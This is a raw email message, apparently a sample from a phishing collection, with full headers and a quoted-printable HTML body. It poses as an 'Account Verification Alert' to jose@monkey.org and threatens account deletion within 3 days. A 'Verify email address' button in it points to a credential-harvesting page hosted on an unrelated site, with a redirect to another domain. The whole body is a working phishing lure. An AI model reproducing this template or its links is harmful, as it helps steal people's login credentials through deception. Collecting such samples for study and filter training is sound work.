@@ -1,0 +1,153 @@
+Return-Path: admin@igenetikkaa.xyz
+Delivered-To: jose@monkey.org
+X-FDA: 83387322312.31.533F2B0
+Received: from mail0.igenetikkaa.xyz (igenetikkaa.xyz [91.219.151.232])
+	by imf22.b.hostedemail.com (Postfix) with ESMTP id 9234C16000D
+	for <jose@monkey.org>; Tue, 29 Apr 2025 14:32:34 +0000 (UTC)
+Authentication-Results: imf22.b.hostedemail.com;
+	dkim=pass header.d=igenetikkaa.xyz header.s=dkim header.b=f5yAQPNT;
+	spf=pass (imf22.b.hostedemail.com: domain of admin@igenetikkaa.xyz designates
+ 91.219.151.232 as permitted sender) smtp.mailfrom=admin@igenetikkaa.xyz;
+	dmarc=pass (policy=none) header.from=igenetikkaa.xyz
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=hostedemail.com;
+	s=arc-20220608; t=1745937154;
+	h=from:from:sender:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:mime-version:mime-version:
+	 content-type:content-type:
+	 content-transfer-encoding:content-transfer-encoding:in-reply-to:
+	 references:dkim-signature; bh=c0Eea/z8O4cIIGXZ2M0iVgjl6PwPyfUVPqfWcoCu5pM=;
+	b=A/HtwcAbb1DoFgkhiAFL3Up9C/5/n4aORKfNvQx7Nr5HnFAKbUxz+gmifRteMLdQ3pTukN
+	Pcp22xBZj06yCq5EwK2DP1r2nlN8FRkv9ZD2Mu48gCzn3fkgSy14BW9tjyfidhR9iaN6cw
+	3zYRNq+wP/D7ALKWuvjewzFcSg5JdNk=
+ARC-Authentication-Results: i=1;
+	imf22.b.hostedemail.com;
+	dkim=pass header.d=igenetikkaa.xyz header.s=dkim header.b=f5yAQPNT;
+	spf=pass (imf22.b.hostedemail.com: domain of admin@igenetikkaa.xyz designates
+ 91.219.151.232 as permitted sender) smtp.mailfrom=admin@igenetikkaa.xyz;
+	dmarc=pass (policy=none) header.from=igenetikkaa.xyz
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1745937154; a=rsa-sha256;
+	cv=none;
+	b=Qxr82pNSXKACCCVUOaekMzYsgONSiWIngZa/LfI6mpaF8cmjFYTPYQ2isPQ4COdDRV2aCk
+	GUI5z7zcIk9WtArZpzZnbjXaTsH0uNvx3u8OKRhjNh6QINVSBtYharloYiy1oSdEDO7nPD
+	HxzGlzlYrEQImNp3BeCcWDdJUiGpsRU=
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; s=dkim;
+ d=igenetikkaa.xyz;
+ h=From:To:Subject:Date:Message-ID:MIME-Version:Content-Type:
+ Content-Transfer-Encoding;
+ bh=c0Eea/z8O4cIIGXZ2M0iVgjl6PwPyfUVPqfWcoCu5pM=;
+ b=f5yAQPNTn7UlYKddpA1KhdPwqZSqoedLTCXsB5ci0iPcs1A6kNW8LOcomSjzsE5XoHm9Zl2HDCC1
+   r4phim01V2Gs96H6oiiUhRSkPPC3fY0Wa6s77xUXr3hiQlraa4XybyuK4DyEZxJKoBqwDuvqZ+s7
+   ovaCC+rx0U3IdQ3BJbQnh9vobmX0Z00aRh3QrGGay0Z2TFL9sW/yU3WTmpVwW384p57swttuAwll
+   Z2ar7T9jom4Ev92p5EXrHHw98CMELz+WCjdai2whKI4YZ5J4gw94xFdENGzqbEByK8U5ZPOzCImM
+   /yM45EHxxl15hk15XSxsRmR4yFyqr4KvCptwXQ==
+From: Email Verification <admin@igenetikkaa.xyz>
+To: jose@monkey.org
+Subject: jose@monkey.org Account Verification Alert! - 29 Apr 2025
+Date: 29 Apr 2025 07:32:32 -0700
+Message-ID: <20250429073232.ED97A470C18FE2CE@igenetikkaa.xyz>
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+X-Rspamd-Queue-Id: 9234C16000D
+X-Stat-Signature: modgh14dbiuy8991gyo8j1o156gjksta
+X-Rspam-User: 
+X-Spam-Status: Yes, score=9.80
+X-Rspamd-Server: rspam12
+X-HE-Tag: 1745937154-97844
+X-HE-Meta: 
+ U2FsdGVkX18MYdr1X4Pg5qr+1N0qsbYW90R1k+HT8b7KYyWtV0b/RTGLy+ZTYM43uNxdTKrh4uiw+RrnlEd2O0p1lNoyjaYyLsWROXnSEi2Y+5XSbCVmvAhjGxtulMMb5JB887bsSpYBBL9aw1Eejmo8djVdYP3P4hO0SaDjhKartx0kcXtoIvzZDrQTNl0iz/Kom2GKfL0kdswiA8AsGKK+BnoxZdb5nhmR62ck4qqsI/XF3OWcOZenonGk/4lQFx5V3yO7XjMuX7DDq2RRcKFoN5tvcRv2/756IE6Cu3sK4pmEn61N1j9hPRW9n6UEESrePia6WqUTY/mf7FsMGLNbQIE1FKY7RzLKLBTIv4VSiTw0b61Itcb8ZpMZGvf+iODfZOL7f1R5PH3go80UV/52KYe+5R/ZhNDZXdERdZcOputjSTN++gJo9rNFIAlnNhBNSLEXAZCfuKxb3MJaJGQSGiVGH9GT5nqwkCfr2b7p1MJ7ob6Wnw5rnt5vDWUX0JDuXn7IOPdZ/1odH80Tp0IlKDnLiYNAY14CIUxFOIT2xL8Ui6Y9mV51kSULMrXr3qKPde4eFSB0g5THP44LAmc+2kfGgnT3nJ5nf4Op4H2jtxQYHFOjI+K0gmm8iTPx6S8BuXYGjSWunxsWwpX1Mf99h/APVUD9P0ZuLARTP/R0goRyHro1NubKlv35uYzp7DkmAe+el2Cs9bEeRNHqAOnfiyN45kl7wsZ56rllNo5UU7hVE1vE+ZULGy1OuHPD5xrxBOBW7TrfKsmGcoUJf0vf2/fxNKF1Kb6BdwSlt+OheK5r2c3JE7bxeubhgcmK/3JwpqbjVhssWn/5cADbH5mtX7BxIQnhPTzvn/2AG3Xlv8KpggjvXnmykJ2tv7QeA8zkOkAxfoJw1Qj+w9vg4i9syqg29PBrSfiqwoEPR6qY9j0BFj+Yx6rKwSR24kk+dHHyDGRgyhPrhMrq/D5cth5dBoh
+ JgIzr/aqiVIKp5/KFtAe++HJXrQaQgjsJLFpNCyh4qZNZgsOQjybx1NHLzhEnT6kJ/huZWBYu1ablJ2TDX5zZjcXmGcppjM/9oQ6upuQ6Q43m0u3no7nx1R1wz9hFaHHMgqE/m37Q++qEMY7HZt0wfkBwFgWBRr00T1cwkFE5tLs5bjdiMwnKZdwL3Blqa6eoNkQyaQlWWcyby7dtJ/FS2o3Mb5c/VVbjUoASmrajCe17q+Z39ArieIF9AEguLOT/4vY+FEDBu73LhJubNXLlaAntqFgiJ48HA2bdiTG8G07ARCVW44Hq6ZCw6x+nLplnPSgqWhI+ViuXEFJ40GbGL+44Y+FvkONslIxdM7EfzE2lpmJAY9OzYBlJaN/gDdoFXRvySVmOyn4SFddTnfIcGg9HE5/IbydpnC4AJmKBMWwlMEsYg29XWqmKE/RzQzDYld9xG7Cibu8GYGKrEerz7q2P36TzIeL+6jx185S0X9duXtZmUkUqb0P5eLGR2Of/9M4VYa78YyHaM2sTRXSmogLJiIpEqdfjeAOnAaccf1mV0FJw+u/2eQE4zw==
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 190
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.=
+w3.org/TR/html4/loose.dtd">
+
+<HTML><HEAD>
+<META name=3DGENERATOR content=3D"MSHTML 11.00.10570.1001"></HEAD>
+<body style=3D"MARGIN: 0.5em">
+<DIV dir=3Dltr>
+<DIV dir=3Dltr>
+<DIV dir=3Dltr>
+<DIV dir=3Dltr>
+<DIV dir=3Dltr>
+<DIV dir=3Dltr>
+<DIV dir=3Dltr>
+<DIV dir=3Dltr>
+<DIV dir=3Dltr>
+<DIV dir=3Dltr>
+<DIV dir=3Dltr>
+<DIV dir=3Dltr>
+<DIV dir=3Dltr>
+<DIV dir=3Dltr>
+<DIV dir=3Dltr>
+<DIV style=3D'FONT-SIZE: medium; FONT-FAMILY: "Times New Roman"; WHITE-SPAC=
+E: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR=
+: rgb(0,0,0); FONT-STYLE: normal; MIN-HEIGHT: 1em; LETTER-SPACING: normal; =
+TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant-caps: normal=
+; text-decoration-style: initial; text-decoration-color: initial'>
+<DIV style=3D"MIN-HEIGHT: 1em"><SPAN>
+<table>
+<TBODY>
+<TR>
+<td>
+<DIV style=3D"FONT-SIZE: 11px; FONT-FAMILY: Helvetica,Arial,sans-serif; WHI=
+TE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400=
+; COLOR: rgb(53,55,64); PADDING-BOTTOM: 40px; FONT-STYLE: normal; TEXT-ALIG=
+N: left; PADDING-TOP: 40px; PADDING-LEFT: 20px; MIN-HEIGHT: 1em; LETTER-SPA=
+CING: normal; LINE-HEIGHT: 1.5; PADDING-RIGHT: 20px; BACKGROUND-COLOR: rgb(=
+255,255,255); TEXT-INDENT: 0px">
+<H1 style=3D"COLOR: rgb(32,33,35); MARGIN: 0px 0px 20px; LINE-HEIGHT: 40px"=
+></H1>
+<H5 style=3D'BOX-SIZING: border-box; BORDER-TOP: 0px; FONT-FAMILY: Roboto,O=
+xygen,Ubuntu,Cantarell,"Fira Sans","Droid Sans","Helvetica Neue",sans-serif=
+; BORDER-RIGHT: 0px; WHITE-SPACE: normal; WORD-SPACING: 0px; BORDER-BOTTOM:=
+ 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 500; PADDING-BOTTOM: 0px; FONT-STY=
+LE: normal; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; MARGIN: =
+30px 0px 1px; LETTER-SPACING: normal; LINE-HEIGHT: 1.2; PADDING-RIGHT: 0px;=
+ BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT:=20
+0px; font-variant-ligatures: normal; font-variant-caps: normal; text-decora=
+tion-style: initial; text-decoration-color: initial'><FONT size=3D6>Account=
+ Verification Alert! </FONT><BR></H5>
+<DIV><BR></DIV>
+<P style=3D"FONT-SIZE: 16px; MARGIN-BOTTOM: 0px; MARGIN-TOP: 0px; LINE-HEIG=
+HT: 24px">Hello jose,&nbsp;</P>
+<P style=3D"FONT-SIZE: 16px; MARGIN-BOTTOM: 0px; MARGIN-TOP: 0px; LINE-HEIG=
+HT: 24px"><BR></P>
+<P style=3D"FONT-SIZE: 16px; MARGIN-BOTTOM: 0px; MARGIN-TOP: 0px; LINE-HEIG=
+HT: 24px">You're receiving this mail because your email account (jose@monke=
+y.org) requires verification from 29 Apr 2025. Please verify this email add=
+ress to avoid obstruction of service or account deletion.<BR></P>
+<P style=3D"TEXT-ALIGN: left; MARGIN: 24px 0px 0px">
+<A style=3D"FONT-SIZE: 16px; TEXT-DECORATION: none; FONT-FAMILY: Helvetica,=
+sans-serif; BACKGROUND: rgb(16,163,127) 0% 50%; FONT-WEIGHT: 400; COLOR: wh=
+ite; PADDING-BOTTOM: 11px; PADDING-TOP: 12px; PADDING-LEFT: 20px; MARGIN: 0=
+px; LINE-HEIGHT: 24px; PADDING-RIGHT: 20px" href=3D"https://portfolio.cept.=
+ac.in/assets/projects/visuals/2023/AR3017/mmmimge.html#jose@monkey.org" rel=
+=3Dnoreferrer target=3D_blank=20
+data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttps://www.clinicsa=
+lamateno.com/.../index.php?i%3Di%260%3D%5B%5B-Email-%5D%5D&amp;source=3Dgma=
+il&amp;ust=3D1745592337519000&amp;usg=3DAOvVaw1yVJ-Pzt8IO4VjczGN1FPk">Verif=
+y email address</A> <BR></P></DIV>
+<DIV style=3D"FONT-SIZE: 13px; FONT-FAMILY: Helvetica,Arial,sans-serif; BAC=
+KGROUND: rgb(255,255,255) 0% 50%; WHITE-SPACE: normal; WORD-SPACING: 0px; T=
+EXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(110,110,128); PADDING-BOT=
+TOM: 20px; FONT-STYLE: normal; TEXT-ALIGN: left; PADDING-TOP: 0px; PADDING-=
+LEFT: 20px; MIN-HEIGHT: 1em; LETTER-SPACING: normal; LINE-HEIGHT: 1.4; PADD=
+ING-RIGHT: 20px; TEXT-INDENT: 0px">
+<P style=3D"MARGIN: 0px">This link will expire in&nbsp;3 days. If verificat=
+ion is not complete, you might lose your account. Please wait while your re=
+quest is being verified...</P>
+<P style=3D"MARGIN: 0px"><BR></P>
+<P style=3D"MARGIN: 0px">For help, contact us through our<SPAN>&nbsp;</SPAN=
+><A style=3D"TEXT-DECORATION: none; COLOR: rgb(0,105,166); BACKGROUND-COLOR=
+: transparent" rel=3Dnoreferrer>Help center</A>.</P>
+<P style=3D"MARGIN: 0px"><BR></P>
+<P style=3D"MARGIN: 0px"><BR></P></DIV></TD></TR></TBODY></TABLE></SPAN></D=
+IV></DIV><BR></DIV></DIV></DIV></DIV></DIV></DIV></DIV></DIV></DIV></DIV></=
+DIV></DIV></DIV></DIV></DIV></BODY></HTML>
+
